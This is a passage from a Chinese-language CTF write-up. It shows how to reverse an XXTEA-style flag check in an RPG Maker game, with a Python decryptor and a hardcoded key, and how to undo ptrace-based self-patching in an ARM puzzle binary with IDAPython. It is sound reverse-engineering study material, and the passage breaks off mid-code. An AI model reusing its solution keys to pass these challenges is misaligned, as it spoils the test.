2_147_483_648)</span></span><br><span class="line"><span class="params">      n += 4_294_967_296 <span class="keyword">while</span> (n &lt;= -2_147_483_648)</span></span><br><span class="line"><span class="params">      n.to_i</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def int32(n)</span></span><br><span class="line"><span class="params">      <span class="variable language_">self</span>.<span class="keyword">class</span>.int32 n</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    def mx(z, y, sum, p, e)</span></span><br><span class="line"><span class="params">      int32(</span></span><br><span class="line"><span class="params">        ((z &gt;&gt; 5 &amp; 0x07FFFFFF) ^ (y &lt;&lt; 2)) +</span></span><br><span class="line"><span class="params">        ((y &gt;&gt; 3 &amp; 0x1FFFFFFF) ^ (z &lt;&lt; 4))</span></span><br><span class="line"><span class="params">      ) ^ int32((sum ^ y) + (@key[(p &amp; 3) ^ e] ^ z))</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def <span class="variable language_">self</span>.encrypt(key, plaintext)</span></span><br><span class="line"><span class="params">      <span class="variable language_">self</span>.new(key).encrypt(plaintext)</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def encrypt(plaintext)</span></span><br><span class="line"><span class="params">      <span class="keyword">return</span> &#x27;&#x27; <span class="keyword">if</span> plaintext.length == 0</span></span><br><span class="line"><span class="params">      v = str_to_longs(plaintext, <span class="literal">true</span>)</span></span><br><span class="line"><span class="params">      v[1] = 0 <span class="keyword">if</span> v.length == 1</span></span><br><span class="line"><span class="params">      n = v.length - 1</span></span><br><span class="line"><span class="params">      z = v[n]</span></span><br><span class="line"><span class="params">      y = v[0]</span></span><br><span class="line"><span class="params">      q = (6 + 52 / (n + 1)).floor</span></span><br><span class="line"><span class="params">      sum = $de1ta * DELTA</span></span><br><span class="line"><span class="params">      p = 0</span></span><br><span class="line"><span class="params">      <span class="keyword">while</span>(0 &lt;= (q -= 1)) <span class="keyword">do</span></span></span><br><span class="line"><span class="params">        sum = int32(sum + DELTA)</span></span><br><span class="line"><span class="params">        e = sum &gt;&gt; 2 &amp; 3</span></span><br><span class="line"><span class="params">        n.times <span class="keyword">do</span> </span>|i|<span class="params"></span></span><br><span class="line"><span class="params">          y = v[i + 1];</span></span><br><span class="line"><span class="params">          z = v[i] = int32(v[i] + mx(z, y, sum, i, e))</span></span><br><span class="line"><span class="params">          p = i</span></span><br><span class="line"><span class="params">        <span class="keyword">end</span></span></span><br><span class="line"><span class="params">        p += 1</span></span><br><span class="line"><span class="params">        y = v[0];</span></span><br><span class="line"><span class="params">        z = v[p] = int32(v[p] + mx(z, y, sum, p, e))</span></span><br><span class="line"><span class="params">      <span class="keyword">end</span></span></span><br><span class="line"><span class="params">      longs_to_str(v).unpack(&#x27;a*&#x27;).pack(&#x27;m&#x27;).delete(&quot;\n&quot;)</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def <span class="variable language_">self</span>.decrypt(key, ciphertext)</span></span><br><span class="line"><span class="params">      <span class="variable language_">self</span>.new(key).decrypt(ciphertext)</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">  <span class="keyword">end</span></span></span><br><span class="line"><span class="params"><span class="keyword">end</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">def validate_flag(input_flag)</span></span><br><span class="line"><span class="params">  c_flag = input_flag + &quot;\0&quot;</span></span><br><span class="line"><span class="params">  result = $check_flag.call(c_flag)</span></span><br><span class="line"><span class="params">  result == 1</span></span><br><span class="line"><span class="params"><span class="keyword">end</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">def check</span></span><br><span class="line"><span class="params">  flag = $game_party.actors[0].name</span></span><br><span class="line"><span class="params">  key = Scene_RPG::Secret_Class.new(&#x27;rpgmakerxp_D3CTF&#x27;)</span></span><br><span class="line"><span class="params">  cyphertext = key.encrypt(flag)</span></span><br><span class="line"><span class="params">  <span class="keyword">if</span> validate_flag(cyphertext)</span></span><br><span class="line"><span class="params">    $game_variables[1] = 100</span></span><br><span class="line"><span class="params">  <span class="keyword">else</span></span></span><br><span class="line"><span class="params">    $game_variables[1] = 0</span></span><br><span class="line"><span class="params">  <span class="keyword">end</span></span></span><br><span class="line"><span class="params"><span class="keyword">end</span></span></span><br></pre></td></tr></table></figure>

<p>根据加密代码写出解密代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecretDecryptor</span>:</span><br><span class="line">    DELTA = <span class="number">0xF1919810</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="variable language_">self</span>.key = <span class="variable language_">self</span>.str_to_longs(key)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.key) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="variable language_">self</span>.key += [<span class="number">0</span>] * (<span class="number">4</span> - <span class="built_in">len</span>(<span class="variable language_">self</span>.key))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">str_to_longs</span>(<span class="params">s, include_count=<span class="literal">False</span></span>):</span><br><span class="line">        s = s.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        length = <span class="built_in">len</span>(s)</span><br><span class="line">        padding = (<span class="number">4</span> - length % <span class="number">4</span>) % <span class="number">4</span></span><br><span class="line">        s += <span class="string">b&#x27;\0&#x27;</span> * padding</span><br><span class="line">        unpacked = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;%dI&#x27;</span> % (<span class="built_in">len</span>(s) // <span class="number">4</span>), s))</span><br><span class="line">        <span class="keyword">if</span> include_count:</span><br><span class="line">            unpacked.append(length)</span><br><span class="line">        <span class="keyword">return</span> unpacked</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longs_to_str</span>(<span class="params">l, count_included=<span class="literal">False</span></span>):</span><br><span class="line">        length = l[-<span class="number">1</span>] <span class="keyword">if</span> count_included <span class="keyword">else</span> <span class="built_in">len</span>(l) * <span class="number">4</span></span><br><span class="line">        s = struct.pack(<span class="string">&#x27;&lt;%dI&#x27;</span> % <span class="built_in">len</span>(l), *l)</span><br><span class="line">        <span class="keyword">return</span> s[:length].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">int32</span>(<span class="params">n</span>):</span><br><span class="line">        n = n &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">return</span> n <span class="keyword">if</span> n &lt; <span class="number">0x80000000</span> <span class="keyword">else</span> n - <span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mx</span>(<span class="params">self, z, y, sum_, p, e</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.int32(</span><br><span class="line">            ((z &gt;&gt; <span class="number">5</span> &amp; <span class="number">0x07FFFFFF</span>) ^ (y &lt;&lt; <span class="number">2</span>)) +</span><br><span class="line">            ((y &gt;&gt; <span class="number">3</span> &amp; <span class="number">0x1FFFFFFF</span>) ^ (z &lt;&lt; <span class="number">4</span>))</span><br><span class="line">        ) ^ <span class="variable language_">self</span>.int32((sum_ ^ y) + (<span class="variable language_">self</span>.key[(p &amp; <span class="number">3</span>) ^ e] ^ z))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        decoded = base64.b64decode(ciphertext)</span><br><span class="line">        v = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;%dI&#x27;</span> % (<span class="built_in">len</span>(decoded) // <span class="number">4</span>), decoded))</span><br><span class="line">        n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">        q = (<span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>))</span><br><span class="line">        sum_ = q * <span class="variable language_">self</span>.DELTA</span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> sum_ != <span class="number">0</span>:</span><br><span class="line">            e = (sum_ &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">                z = v[p-<span class="number">1</span>]</span><br><span class="line">                v[p] = <span class="variable language_">self</span>.int32(v[p] - <span class="variable language_">self</span>.mx(z, y, sum_, p, e))</span><br><span class="line">                y = v[p]</span><br><span class="line">            z = v[n]</span><br><span class="line">            v[<span class="number">0</span>] = <span class="variable language_">self</span>.int32(v[<span class="number">0</span>] - <span class="variable language_">self</span>.mx(z, y, sum_, <span class="number">0</span>, e))</span><br><span class="line">            y = v[<span class="number">0</span>]</span><br><span class="line">            sum_ = <span class="variable language_">self</span>.int32(sum_ - <span class="variable language_">self</span>.DELTA)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.longs_to_str(v, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ciphertext = <span class="string">&quot;LhVvfepywFIsHb8G8kNdu49J3k0=&quot;</span></span><br><span class="line">    key = <span class="string">&quot;rpgmakerxp_D3CTF&quot;</span></span><br><span class="line">    </span><br><span class="line">    decryptor = SecretDecryptor(key)</span><br><span class="line">    plaintext = decryptor.decrypt(ciphertext)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="aliceinpuzzle">AliceInPuzzle</span><a href="#aliceinpuzzle" class="header-anchor"></a></h2><p>main里提取elf字节为puzzle，反编译发现arm代码存在很多反编译失败的地方，很多字符串调用没找到</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 *__fastcall <span class="title">handle_sigtrap</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//...</span></span><br><span class="line">  ++<span class="built_in">handle_sigtrap</span>(<span class="type">int</span>)::sig_count;</span><br><span class="line">  <span class="keyword">if</span> ( !(__int64)<span class="built_in">ptrace</span>(PTRACE_GETREGSET, a1, (<span class="type">void</span> *)<span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v10;</span><br><span class="line">    v4 = <span class="built_in">ptrace</span>(PTRACE_PEEKTEXT, a1, v10);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    v6 = (_DWORD *)_errno_location(v4);</span><br><span class="line">    <span class="keyword">if</span> ( !*v6 &amp;&amp; v5 == <span class="number">0xD4200000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="built_in">ptrace</span>(PTRACE_PEEKTEXT, a1, v3);</span><br><span class="line">        <span class="keyword">if</span> ( *v6 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v8 = v7 + <span class="number">0xE3201F</span>;</span><br><span class="line">        <span class="built_in">ptrace</span>(PTRACE_POKETEXT, a1, v3);</span><br><span class="line">        <span class="keyword">if</span> ( *v6 || v8 == v5 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v3 += <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;_stack_chk_guard;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析main tracer_main函数可以发现对不同父子进程通讯情况做了不同处理，其中handle_sigtrap存在读取和写入操作</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 *__fastcall <span class="title">handle_sigtrap</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//...</span></span><br><span class="line">  ++<span class="built_in">handle_sigtrap</span>(<span class="type">int</span>)::sig_count;</span><br><span class="line">  <span class="keyword">if</span> ( !(__int64)<span class="built_in">ptrace</span>(PTRACE_GETREGSET, a1, (<span class="type">void</span> *)<span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v10;</span><br><span class="line">    v4 = <span class="built_in">ptrace</span>(PTRACE_PEEKTEXT, a1, v10);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    v6 = (_DWORD *)_errno_location(v4);</span><br><span class="line">    <span class="keyword">if</span> ( !*v6 &amp;&amp; v5 == <span class="number">0xD4200000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="built_in">ptrace</span>(PTRACE_PEEKTEXT, a1, v3);</span><br><span class="line">        <span class="keyword">if</span> ( *v6 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v8 = v7 + <span class="number">0xE3201F</span>;</span><br><span class="line">        <span class="built_in">ptrace</span>(PTRACE_POKETEXT, a1, v3);</span><br><span class="line">        <span class="keyword">if</span> ( *v6 || v8 == v5 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v3 += <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;_stack_chk_guard;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可知ptrace-PTRACE_PEEKTEXT读取4字节并比较是否等于0xD4200000，然后循环处理每四字节+0xE3201F，推测此处为patch puzzle的代码逻辑</p>
<p>在puzzle中用idapython复现出patch逻辑，gpt改了好几版才patch出一个勉强可以看懂逻辑的puzzle代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="comment"># ——————————— 参数区域 ———————————</span></span><br><span class="line">START_EA     = <span class="number">0x401E4C</span>        <span class="comment"># 扫描 / 补丁区间起始地址（包含）</span></span><br><span class="line">END_EA       = <span class="number">0x40215C</span>       <span class="comment"># 扫描 / 补丁区间结束地址（不包含）</span></span><br><span class="line">TRAP_INSN    = <span class="number">0xD4200000</span>      <span class="comment"># “陷阱指令” 32-bit 值 (小端字节序: 00 00 20 D4)</span></span><br><span class="line">PATCH_OFFSET = <span class="number">0x00E3201F</span>      <span class="comment"># 补丁时加到原始值上的偏移</span></span><br><span class="line"><span class="comment"># ——————————————————————————————————————————————</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_next_trap</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从头开始查找下一个 0xD4200000 指令地址，未找到返回 None&quot;&quot;&quot;</span></span><br><span class="line">    ea = START_EA</span><br><span class="line">    <span class="keyword">while</span> ea &lt; END_EA:</span><br><span class="line">        val = ida_bytes.get_wide_dword(ea)</span><br><span class="line">        <span class="keyword">if</span> val == TRAP_INSN:</span><br><span class="line">            <span class="keyword">return</span> ea</span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_from</span>(<span class="params">ea_start</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从 ea_start 开始 patch，每次将当前地址的指令加 PATCH_OFFSET。</span></span><br><span class="line"><span class="string">    如果 patch 后的 new_val 是 TRAP_INSN，则停止 patch。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 开始 patch @ 0x<span class="subst">&#123;ea_start:X&#125;</span>&quot;</span>)</span><br><span class="line">    ea = ea_start</span><br><span class="line">    <span class="keyword">while</span> ea &lt; END_EA:</span><br><span class="line">        orig = ida_bytes.get_wide_dword(ea)</span><br><span class="line">        new_val = (orig + PATCH_OFFSET) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        ida_bytes.patch_dword(ea, new_val)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> new_val == TRAP_INSN:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    → 在 0x<span class="subst">&#123;ea:X&#125;</span> patch 出新 trap（0x<span class="subst">&#123;new_val:08X&#125;</span>），停止本轮&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始循环 patch 所有 TRAP_INSN...&quot;</span>)</span><br><span class="line">    iteration = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        trap_ea = find_next_trap()</span><br><span class="line">        <span class="keyword">if</span> trap_ea <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 所有 TRAP_INSN 已处理完毕，退出。&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n=== 第 <span class="subst">&#123;iteration&#125;</span> 次处理 ===&quot;</span>)</span><br><span class="line">        patch_from(trap_ea)</span><br><span class="line">        iteration += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 脚本执行完毕，请手动保存或导出补丁。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>Puzzle check逻辑如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_401E54</span><span class="params">(..)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//..</span></span><br><span class="line">  v21 = &amp;byte_5A0040;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (*v21 &amp; <span class="number">0x7F</span>) &lt;&lt; v24;</span><br><span class="line">    v24 += <span class="number">7</span>;</span><br><span class="line">    v23 |= v25;</span><br><span class="line">    <span class="keyword">if</span> ( (*v21 &amp; <span class="number">0x80</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_5A1B80[v22++] = v23;</span><br><span class="line">      v24 = <span class="number">0</span>;</span><br><span class="line">      v23 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v21 != (<span class="type">char</span> *)&amp;unk_5A007F );</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[Alice] Hey there, brave challenger~ &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[Alice] I&#x27;m Alice, and you&#x27;ve just stepped into my little puzzle world! &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[Alice] The board is all set up and ready to go... Are you feeling ready to take on the challenge? &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[Alice] Now, show me your solution when you&#x27;re ready!&quot;</span>);</span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(__int64, __int64 *))loc_5062B0)(<span class="number">2LL</span>, &amp;qword_52CAB8);</span><br><span class="line">  a15 = &amp;a17;</span><br><span class="line">  a16 = <span class="number">0LL</span>;</span><br><span class="line">  v32 = *(_QWORD *)off_59FB28[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">LOBYTE</span>(a17) = <span class="number">0</span>;</span><br><span class="line">  v33 = *(_QWORD *)(v32 - <span class="number">24</span>) + off_59FB28[<span class="number">0</span>];</span><br><span class="line">  v34 = *(_QWORD *)(v33 + <span class="number">240</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(v34 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_404360</span>((_QWORD *)off_59FB28[<span class="number">0</span>], (__int64)&amp;a15, *(_BYTE *)(v34 + <span class="number">67</span>));</span><br><span class="line">      v35 = (__int64)a15;</span><br><span class="line">      v36 = <span class="built_in">sub_4F3600</span>((__int64)a15, <span class="number">0x7Bu</span>);</span><br><span class="line">      v37 = <span class="built_in">sub_4F3600</span>(v35, <span class="number">0x7Du</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v36 )</span><br><span class="line">        v45 = v37 == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v45 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v45 || (v46 = v36 + <span class="number">1</span>, v36 + <span class="number">1</span> &gt;= v37) )</span><br><span class="line">        <span class="built_in">sub_4022DC</span>();</span><br><span class="line">      v47 = v37 - v46;</span><br><span class="line">      a19 = &amp;a21;</span><br><span class="line">      a20 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (__int64)(v37 - v46) &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v47 